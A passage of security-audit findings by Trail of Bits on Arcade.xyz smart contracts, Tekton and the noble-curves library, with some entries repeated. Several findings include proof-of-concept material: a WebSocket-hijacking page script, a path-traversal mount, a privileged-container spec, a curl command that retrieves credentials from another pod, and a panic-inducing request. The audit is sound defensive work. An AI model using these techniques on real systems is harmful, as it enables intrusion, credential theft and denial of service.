payable(msg.sender).transfer(msg.value - Figure 11.1: The initializeBundle function in arcade-protocol/contracts/vault/VaultFactory.sol To add an ERC-721 asset to an asset vault, it needs to be transferred to the asset vaults address. Because the ownership of an asset vault is tracked by an ERC-721 token, it is possible to transfer the ownership of an asset vault to another asset vault by simply transferring the ERC-721 token representing vault ownership. To withdraw ERC-721 tokens from an asset vault, the owner (the holder of the asset vaults ERC-721 token) needs to 43 Arcade.xyz V3 Security Assessment enable withdrawals (using the enableWithdraw function) and then call the withdrawERC721 (or withdrawBatch) function. 121 122 123 124 150 151 152 153 154 155 156 function enableWithdraw() external override onlyOwner onlyWithdrawDisabled { withdrawEnabled = true; emit WithdrawEnabled(msg.sender); } Figure 11.2: The enableWithdraw function in arcade-protocol/contracts/vault/AssetVault.sol function withdrawERC721( address token, uint256 tokenId, address to ) external override onlyOwner onlyWithdrawEnabled { _withdrawERC721(token, tokenId, to); } Figure 11.3: The withdrawERC721 function in arcade-protocol/contracts/vault/AssetVault.sol Only the owner of an asset vault can enable and perform withdrawals. Therefore, if two (or more) vaults own each other, it would be impossible for a user to enable or perform withdrawals on the aected vaults, permanently locking all assets (ERC-721, ERC-1155, ERC-20, ETH) within them. The severity of the issue depends on the UI, which was out of scope for this review. If the UI does not prevent vaults from owning each other, the severity of this issue is higher. In terms of likelihood, this issue would require a user to make a mistake (although a mistake that is far more likely than the transfer of tokens to a random address) and would require the UI to fail to detect and prevent or warn the user from making such a mistake. We therefore rated the diculty of this issue as high. Exploit Scenario Alice decides to borrow USDC by putting up some of her NFTs as collateral:", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "16. Malicious borrowers can use forceRepay to grief lenders ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf", "body": "A malicious borrower can grief a lender by calling the forceRepay function instead of the repay function; doing so would allow the borrower to pay less in gas fees and require the lender to perform a separate transaction to retrieve their funds (using the redeemNote function) and to pay a redeem fee. At any time after the loan is set and before the lender claims the collateral if the loan is past its due date, the borrower has to pay their full debt back in order to recover their assets. For doing so, there are two functions in RepaymentController: repay and forceRepay. The dierence between them is that the latter transfers the tokens to the LoanCore contract instead of directly to the lender. It is meant to allow the borrower to pay their obligations when the lender cannot receive tokens for any reason. For the lender to get their tokens back in this scenario, they must call the redeemNote function in RepaymentController, which in turn calls LoanCore.redeemNote, which transfers the tokens to an address set by the lender in the call. Because the borrower is free to decide which function to call to repay their debt, they can arbitrarily decide to do so via forceRepay, obligating the lender to send a transaction (with its associated gas fees) to recover their tokens. Additionally, depending on the conguration of the protocol, it is possible that the lender has to pay an additional fee (LENDER_REDEEM_FEE) to get back their own tokens, cutting their prots with no chance to opt out. 126 127 128 129 130 RC_InvalidState(data.state); 131 132 133 134 BASIS_POINTS_DENOMINATOR; function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 54 Arcade.xyz V3 Security Assessment 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 16.1: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Note that, from the perspective of the borrower, it is actually cheaper to call forceRepay than repay because of the gas saved by not transferring the tokens to the lender and not burning one of the promissory notes. Exploit Scenario Bob has to pay back his loan, and he decides to do so via forceRepay to save gas in the transaction. Lucy, the lender, wants her tokens back. She is now forced to call redeemNote to get them. In this transaction, she lost the gas fees that the borrower would have paid to send the tokens directly to her, and she has to pay an additional fee (LENDER_REDEEMER_FEE), causing her to receive less value from the loan than she originally expected. Recommendations Short term, remove the incentive (the lower gas cost) for the borrower to call forceRepay instead of repay. Consider taking one of the following actions:  Force the lender to always pull their funds using the redeemNote function. This can be achieved by removing the repay function and requiring the borrower to call forceRepay.  Remove the forceRepay function and modify the repay function so that it transfers the funds to the lender in a try/catch statement and creates a redeem note (which the lender can exchange for their funds using the redeemNote function) only if that transfer fails. Long term, when designing a smart contract protocol, always consider the incentives for each party to perform actions in the protocol, and avoid making an actor pay for the mistakes or maliciousness of others. By thoroughly documenting the incentives structure, aws can be spotted and mitigated before the protocol goes live. 55 Arcade.xyz V3 Security Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. The use of time.After() in select statements can lead to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running pipelines. if err := r.RunningPipelineRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } Figure 1.1: tektoncd/pipeline/pkg/pipelinerunmetrics/metrics.go#L290-L300 for { select { case <-ctx.Done(): // When the context is cancelled, stop reporting. return case <-time.After(r.ReportingPeriod): // Every 30s surface a metric for the number of running tasks. if err := r.RunningTaskRuns(lister); err != nil { logger.Warnf(\"Failed to log the metrics : %v\", err) } } Figure 1.2: pipeline/pkg/taskrunmetrics/metrics.go#L380-L391 Exploit Scenario An attacker nds a way to overuse a function, which leads to overconsumption of the memory and causes Tekton Pipelines to crash. Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Risk of resource exhaustion due to the use of defer inside a loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The ExecuteInterceptors function runs all interceptors congured for a given trigger inside a loop. The res.Body.Close() function is deferred at the end of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each interceptor object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call res.Body.Close() at the end of each loop to prevent unforeseen issues. func (r Sink) ExecuteInterceptors(trInt []*triggersv1.TriggerInterceptor, in *http.Request, event []byte, log *zap.SugaredLogger, eventID string, triggerID string, namespace string, extensions map[string]interface{}) ([]byte, http.Header, *triggersv1.InterceptorResponse, error) { if len(trInt) == 0 { return event, in.Header, nil, nil } // (...) for _, i := range trInt { if i.Webhook != nil { // Old style interceptor // (...) defer res.Body.Close() Figure 2.1: triggers/pkg/sink/sink.go#L428-L469 Recommendations Short term, rather than deferring the call to res.Body.Close(), add a call to res.Body.Close() at the end of the loop.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Lack of access controls for Tekton Pipelines API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible. 4. Insu\u0000cient validation of volumeMounts paths Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-4 Target: Various", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "5. Missing validation of Origin header in WebSocket upgrade requests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton Dashboard uses the WebSocket protocol to provide real-time updates for TaskRuns, PipelineRuns, and other Tekton data. The endpoints responsible for upgrading the incoming HTTP request to a WebSocket request do not validate the Origin header to ensure that the request is coming from a trusted origin (i.e., the dashboard itself). As a result, arbitrary malicious web pages can connect to Tekton Dashboard and receive these real-time updates, which may include sensitive information, such as the log output of TaskRuns and PipelineRuns. Exploit Scenario A user hosts Tekton Dashboard on a private address, such as one in a local area network or a virtual private network (VPN), without enabling application-layer authentication. An attacker identies the URL of the dashboard instance (e.g., http://192.168.3.130:9097) and hosts a web page with the following content: <script> var ws = new WebSocket(\"ws://192.168.3.130:9097/apis/tekton.dev/v1beta1/namespaces/tekton-pipelin es/pipelineruns/?watch=true&resourceVersion=1770\"); ws.onmessage = function (event) { console.log(event.data); } </script> Figure 5.1: A malicious web page that extracts Tekton Dashboard WebSocket updates The attacker convinces the user to visit the web page. Upon loading it, the users browser successfully connects to the Tekton Dashboard WebSocket endpoint for monitoring PipelineRuns and logs received messages to the JavaScript console. As a result, the attackers untrusted web origin now has access to real-time updates from a dashboard instance on a private network that would otherwise be inaccessible outside of that network. Figure 5.2: The untrusted origin http://localhost:8080 has access to Tekton Dashboard WebSocket messages. Recommendations Short term, modify the code so that it veries that the Origin header of WebSocket upgrade requests corresponds to the trusted origin on which Tekton Dashboard is served. For example, if the origin is not http://192.168.3.130:9097, Tekton Dashboard should reject the incoming request. 6. Import resources feature does not validate repository URL scheme Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-6 Target: Dashboard", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "8. Tekton allows users to create privileged containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature. 9. Insu\u0000cient default network access controls between pods Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-TKN-9 Target: Pipelines", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "11. Lack of rate-limiting controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton Dashboard does not enforce rate limiting of HTTP requests. As a result, we were able to issue over a thousand requests in just over a minute. Figure 11.1: We sent over a thousand requests to Tekton Dashboard without being rate limited. Processing requests sent at such a high rate can consume an inordinate amount of resources, increasing the risk of denial-of-service attacks through excessive resource consumption. In particular, we were able to create hundreds of running import resources pods that were able to consume nearly all the hosts memory in the span of a minute. Exploit Scenario An attacker oods a Tekton Dashboard instance with HTTP requests that execute pipelines, leading to a denial-of-service condition. Recommendations Short term, implement rate limiting on all API endpoints. Long term, run stress tests to ensure that the rate limiting enforced by Tekton Dashboard is robust.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "12. Lack of maximum request and response body constraint ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. This function is used in dierent les of the Tekton Triggers and Tekton Pipelines codebases to read requests and responses. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File pkg/remote/oci/resolver.go:L211 pkg/sink/sink.go:147,465 Project Pipelines Triggers pkg/interceptors/webhook/webhook.go:77 Triggers pkg/interceptors/interceptors.go:176 Triggers pkg/sink/validate_payload.go:29 cmd/binding-eval/cmd/root.go:141 cmd/triggerrun/cmd/root.go:182 Triggers Triggers Triggers Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limit can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Lack of access controls for Tekton Pipelines API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Tekton Pipelines extension uses an API to process requests for various tasks such as listing namespaces and creating TaskRuns. While Tekton provides documentation on enabling OAuth2 authentication, the API is unauthenticated by default. Should a Tekton operator expose the dashboard for other users to monitor their own deployments, every API method would be available to them, allowing them to perform tasks on namespaces that they do not have access to. Figure 3.1: Successful unauthenticated request Exploit Scenario An attacker discovers the endpoint exposing the Tekton Pipelines API and uses it to perform destructive tasks such as deleting PipelineRuns. Furthermore, the attacker can discover potentially sensitive information pertaining to deployments congured in Tekton. Recommendations Short term, add documentation on securing access to the API using Kubernetes security controls, including explicit documentation on the security implications of exposing access to the dashboard and, therefore, the API. Long term, add an access control mechanism for controlling who can access the API and limiting access to namespaces as needed and/or possible.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "4. Insu\u0000cient validation of volumeMounts paths ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Tekton Pipelines extension performs a number of validations against task steps whenever a task is submitted for Tekton to process. One such validation veries that the path for a volume mount is not inside the /tekton directory. This directory is treated as a special directory by Tekton, as it is used for Tekton-specic functionality. However, the extension uses strings.HasPrefix to verify that MountPath does not contain the string /tekton/ without rst sanitizing it. As a result, it is possible to create volume mounts inside /tekton by using path traversal strings such as /somedir/../tekton/newdir in the volumeMounts variable of a task step denition. for j, vm := range s.VolumeMounts { if strings.HasPrefix(vm.MountPath, \"/tekton/\") && !strings.HasPrefix(vm.MountPath, \"/tekton/home\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(\"volumeMount cannot be mounted under /tekton/ (volumeMount %q mounted at %q)\", vm.Name, vm.MountPath), \"mountPath\").ViaFieldIndex(\"volumeMounts\", j)) } if strings.HasPrefix(vm.Name, \"tekton-internal-\") { errs = errs.Also(apis.ErrGeneric(fmt.Sprintf(`volumeMount name %q cannot start with \"tekton-internal-\"`, vm.Name), \"name\").ViaFieldIndex(\"volumeMounts\", j)) } } Figure 4.1: pipeline/pkg/apis/pipeline/v1beta1/task_validation.go#L218-L226 The YAML le in the gure below was used to create a volume in the reserved /tekton directory. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: vol-test spec: taskSpec: steps: - image: docker name: client workingDir: /workspace script: | #!/usr/bin/env sh sleep 15m volumeMounts: - mountPath: /certs/client/../../../tekton/mytest name: empty-path volumes: - name: empty-path emptyDir: {} Figure 4.2: Task run le used to create a volume mount inside an invalid location The gure below demonstrates that the previous le successfully created the mytest directory inside of the /tekton directory by using a path traversal string. $ kubectl exec -i -t vol-test -- /bin/sh Defaulted container \"step-client\" out of: step-client, place-tools (init), step-init (init), place-scripts (init) /workspace # cd /tekton/ /tekton # ls bin creds downward home scripts steps termination results run mytest Figure 4.3: Logging into the task pod container, we can now list the mytest directory inside of /tekton. Recommendations Short term, modify the code so that it converts the mountPath string into a le path and uses a function such as filepath.Clean to sanitize and canonicalize it before validating it.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "7. Insu\u0000cient security hardening of step containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Containers used for running task and pipeline steps have excessive security context options enabled. This increases the attack surface of the system, and issues such as Linux kernel bugs may allow attackers to escape a container if they gain code execution within a Tekton container. The gure below shows the security properties of a task container with the docker driver. 0 0 0 0 0 0 cat 0 0 # cat /proc/self/status | egrep 'Name|Uid|Gid|Groups|Cap|NoNewPrivs|Seccomp' Name: Uid: Gid: Groups: CapInh: 00000000a80425fb CapPrm: 00000000a80425fb CapEff: 00000000a80425fb CapBnd: 00000000a80425fb CapAmb: 0000000000000000 NoNewPrivs: 0 0 Seccomp: Seccomp_filters: 0 Figure 7.1: The security properties of one of the step containers Exploit Scenario Eve nds a bug that allows her to run arbitrary code on behalf of a conned process within a container, using it to gain more privileges in the container and then to attack the host. Recommendations Short term, drop default capabilities from containers and prevent processes from gaining additional privileges by setting the --cap-drop=ALL and --security-opt=no-new-privileges:true ags when starting containers. Long term, review and implement the Kubernetes security recommendations in appendix C.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Tekton allows users to create privileged containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "Tekton allows users to dene task and sidecar objects with a privileged security context, which eectively grants task containers all capabilities. Tekton operators can use admission controllers to disallow users from using this option. However, information on this mitigation in the guidance documents for Tekton Pipelines is insucient and should be made clear. If an attacker gains code execution on any of these containers, the attacker could break out of it and gain full access to the host machine. We were not able to escape step containers running in privileged mode during the time allotted for this audit. apiVersion: tekton.dev/v1beta1 kind: TaskRun metadata: name: build-push-secret-10 spec: serviceAccountName: build-bot taskSpec: steps: - name: secret securityContext: privileged: true image: ubuntu script: | #!/usr/bin/env bash sleep 20m Figure 8.1: TaskRun denition with the privileged security context root@build-push-secret-10-pod:/proc/fs# find -type f -maxdepth 5 -writable find: warning: you have specified the global option -maxdepth after the argument -type, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it. Please specify global options before other arguments. ./xfs/xqm ./xfs/xqmstat ./cifs/Stats ./cifs/cifsFYI ./cifs/dfscache ./cifs/traceSMB ./cifs/DebugData ./cifs/open_files ./cifs/SecurityFlags ./cifs/LookupCacheEnabled ./cifs/LinuxExtensionsEnabled ./ext4/vda1/fc_info ./ext4/vda1/options ./ext4/vda1/mb_groups ./ext4/vda1/es_shrinker_info ./jbd2/vda1-8/info ./fscache/stats Figure 8.2: With the privileged security context in gure 8.1, it is now possible to write to several les in /proc/fs, for example. Exploit Scenario A malicious developer runs a TaskRun with a privileged security context and obtains shell access to the container. Using one of various known exploits, he breaks out of the container and gains root access on the host. Recommendations Short term, create clear, easy-to-locate documentation warning operators about allowing developers and other users to dene a privileged security context for step containers, and include guidance on how to restrict such a feature.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "9. Insu\u0000cient default network access controls between pods ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "By default, containers deployed as part of task steps do not have any egress or ingress network restrictions. As a result, containers could reach services exposed over the network from any task step container. For instance, in gure 9.2, a user logs into a container running a task step in the developer-group namespace and successfully makes a request to a service in a step container in the qa-group namespace. root@build-push-secret-35-pod:/# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.17.0.17 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:11 txqueuelen 0 (Ethernet) RX packets 21831 bytes 32563599 (32.5 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6465 bytes 362926 (362.9 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@build-push-secret-35-pod:/# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 172.17.0.16 - - [08/Mar/2022 01:03:50] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - 172.17.0.16 - - [08/Mar/2022 01:04:05] \"GET /tekton/creds-secrets/basic-user-pass-canary/password HTTP/1.1\" 200 - Figure 9.1: Exposing a simple server in a step container in the developer-group namespace root@build-push-secret-35-pod:/# curl 172.17.0.17:8000/tekton/creds-secrets/basic-user-pass-canary/password mySUPERsecretPassword Figure 9.2: Reaching the service exposed in gure 9.1 from another container in the qa-group namespace Exploit Scenario An attacker launches a malicious task container that reaches a service exposed via a sidecar container and performs unauthorized actions against the service. Recommendations Short term, enforce ingress and egress restrictions to allow only resources that need to speak to each other to do so. Leverage allowlists instead of denylists to ensure that only expected components can establish these connections. Long term, ensure the use of appropriate methods of isolation to prevent lateral movement. 10. Import resources\" feature does not validate repository path Severity: Informational Diculty: Low Type: Data Validation Finding ID: TOB-TKN-10 Target: Dashboard", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Nil dereferences in the trigger interceptor logic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Tekton.pdf", "body": "The Process functions, which are responsible for executing the various triggers for the git, gitlab, bitbucket, and cel interceptors, do not properly validate request objects, leading to nil dereference panics when requests are submitted without a Context object. func (w *Interceptor) Process(ctx context.Context, r *triggersv1.InterceptorRequest) *triggersv1.InterceptorResponse { headers := interceptors.Canonical(r.Header) // (...) // Next validate secrets if p.SecretRef != nil { // Check the secret to see if it is empty if p.SecretRef.SecretKey == \"\" { interceptor secretRef.secretKey is empty\") return interceptors.Fail(codes.FailedPrecondition, \"github } // (...) ns, _ := triggersv1.ParseTriggerID(r.Context.TriggerID) Figure 13.1: triggers/pkg/interceptors/github/github.go#L48-L85 We tested the panic by forwarding the Tekton Triggers webhook server to localhost and sending HTTP requests to the GitHub endpoint. The Go HTTP server recovers from the panic. curl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:1934' -H $'Content-Length: 178' \\ --data-binary $'{\\x0d\\x0a\\\"header\\\":{\\x0d\\x0a\\\"X-Hub-Signature\\\":[\\x0d\\x0a\\x09\\\"sig\\\"\\x0d\\x0a],\\x0 d\\x0a\\\"X-GitHub-Event\\\":[\\x0d\\x0a\\\"evil\\\"\\x0d\\x0a]\\x0d\\x0a},\\x0d\\x0a\\\"interceptor_pa rams\\\": {\\x0d\\x0a\\x09\\\"secretRef\\\": {\\x0d\\x0a\\x09\\x09\\\"secretKey\\\":\\\"key\\\",\\x0d\\x0a\\x09\\x09\\\"secretName\\\":\\\"name\\\"\\x0d\\x 0a\\x09}\\x0d\\x0a}\\x0d\\x0a}' \\ $'http://127.0.0.1:1934/github' Figure 13.2: The curl request that causes a panic 2022/03/08 05:34:13 http: panic serving 127.0.0.1:49304: runtime error: invalid memory address or nil pointer dereference goroutine 33372 [running]: net/http.(*conn).serve.func1(0xc0001bf0e0) net/http/server.go:1824 +0x153 panic(0x1c25340, 0x30d6060) runtime/panic.go:971 +0x499 github.com/tektoncd/triggers/pkg/interceptors/github.(*Interceptor).Process(0xc00000 d248, 0x216fec8, 0xc0003d5020, 0xc0002b7b60, 0xc0000a7978) github.com/tektoncd/triggers/pkg/interceptors/github/github.go:85 +0x1f5 github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ExecuteInterceptor(0x c000491490, 0xc000280200, 0x0, 0x0, 0x0, 0x0, 0x0) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:128 +0x5df github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ServeHTTP(0xc00049149 0, 0x2166dc0, 0xc0000d42a0, 0xc000280200) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:57 +0x4d net/http.(*ServeMux).ServeHTTP(0xc00042d000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2448 +0x1ad net/http.serverHandler.ServeHTTP(0xc0000d4000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2887 +0xa3 net/http.(*conn).serve(0xc0001bf0e0, 0x216ff00, 0xc00042d200) net/http/server.go:1952 +0x8cd created by net/http.(*Server).Serve net/http/server.go:3013 +0x39b Figure 13.3: Panic trace Exploit Scenario As the codebase continues to grow, a new mechanism is added to call one of the Process functions without relying on HTTP requests (for instance, via a custom RPC client implementation). An attacker uses this mechanism to create a new interceptor. He calls the Process function with an invalid object, causing a panic that crashes the Tekton Triggers webhook server. Recommendations Short term, add checks to verify that request Context objects are not nil before dereferencing them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "1. Timing issues ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-ryanshea-noblecurveslibrary-securityreview.pdf", "body": "The library provides a scalar multiplication routine that aims to keep the number of BigInteger operations constant, in order to be (close to) constant-time. However, there are some locations in the implementation where timing dierences can cause issues:    Pre-computed point look-up during scalar multiplication (gure 1.1) Second part of signature generation Tonelli-Shanks square root computation // Check if we're onto Zero point. // Add random point inside current window to f. const offset1 = offset; const offset2 = offset + Math .abs(wbits) - 1 ; // -1 because we skip zero const cond1 = window % 2 !== 0 ; const cond2 = wbits < 0 ; if (wbits === 0 ) { // The most important part for const-time getPublicKey f = f.add(constTimeNegate(cond1, precomputes[offset1])); } else { p = p.add(constTimeNegate(cond2, precomputes[offset2])); } Figure 1.1: Pre-computed point lookup during scalar multiplication ( noble-curves/src/abstract/curve.ts:117128 ) The scalar multiplication routine comprises a loop, part of which is shown in Figure 1.1. Each iteration adds a selected pre-computed point to the accumulator p (or to the dummy accumulator f if relevant scalar bits are all zero). However, the array access to select the appropriate pre-computed point is not constant-time. Figure 1.2 shows how the implementation computes the second half of an ECDSA signature. 14 noble-curves Security Assessment const s = modN(ik * modN(m + modN(d * r))); // s = k^-1(m + rd) mod n Figure 1.2: Generation of the second part of the signature ( noble-curves/src/abstract/weierstrass.ts:988 ) First, the private key is multiplied by the rst half of the signature and reduced modulo the group order. Next, the message digest is added and the result is again reduced modulo the group order. If the modulo operation is not constant-time, and if an attacker can detect this timing dierence, they can perform a lattice attack to recover the signing key. The details of this attack are described in the TCHES 2019 article by Ryan . Note that the article does not show that this timing dierence attack can be practically exploited, but instead mounts a cache-timing attack to exploit it. FpSqrt is a function that computes square roots of quadratic residues over  . Based on   , this function chooses one of several sub-algorithms, including  the value of Tonelli-Shanks. Some of these algorithms are constant-time with respect to , but some are not. In particular, the implementation of the Tonelli-Shanks algorithm has a high degree of timing variability. The FpSqrt function is used to decode compressed point representations, so it can inuence timing when handling potentially sensitive or adversarial data. Most texts consider Tonelli-Shanks the fallback algorithm when a faster or simpler algorithm is unavailable. However, Tonelli-Shanks can be used for any prime modulus Further, Tonelli-Shanks can be made constant time for a given value of  .  . Timing leakage threats can be reduced by modifying the Tonelli-Shanks code to run in constant time (see here ), and making the constant-time implementation the default square root algorithm. Special-case algorithms can be broken out into separate functions (whether constant- or variable-time), for use when the modulus is known to work, or timing attacks are not a concern. Exploit Scenario An attacker interacts with a user of the library and measures the time it takes to execute signature generation or ECDH key exchange. In the case of static ECDH, the attacker may provide dierent public keys to be multiplied with the static private key of the library user. In the case of ECDSA, the attacker may get the user to repeatedly sign the same message, which results in scalar multiplications on the base point using the same deterministically generated nonce. The attacker can subsequently average the obtained execution times for operations with the same input to gain more precise timing estimates. Then, the attacker uses the obtained execution times to mount a timing attack: 15 noble-curves Security Assessment   In the case of ECDSA, the attacker may attempt to mount the attack from the TCHES 2019 article by Ryan . However, it is unknown whether this attack will work in practice when based purely on timing. In the case of static ECDH, the attacker may attempt to mount a recursive attack, similar to the attacks described in the Cardis 1998 article by Dhem et al. or the JoCE 2013 article by Danger et al. Note that the timing dierences caused by the precomputed point look-up may not be sucient to mount such a timing attack. The attacker would need to nd other timing dierences, such as dierences in the point addition routines based on one of the input points. The fact that the library uses a complete addition formula increases the diculty, but there could still be timing dierences caused by the underlying big integer arithmetic. Determining whether such timing attacks are practically applicable to the library (and how many executions they would need) requires a large number of measurements on a dedicated benchmarking system, which was not done as part of this engagement. Recommendations Short term, consider adding scalar randomization to primitives where the same private scalar can be used multiple times, such as ECDH and deterministic ECDSA. To mitigate the attack from the TCHES 2019 article by Ryan , consider either blinding the private scalar in the signature computation or removing the modular reduction of  =  (  *  (  +  *  )) , i.e.,     . Long term, ensure that all low-level operations are constant-time. References    Return of the Hidden Number Problem, Ryan, TCHES 2019 A Practical Implementation of the Timing Attack, Dhem et al., Cardis 1998 A synthesis of side-channel attacks on elliptic curve cryptography in smart-cards, 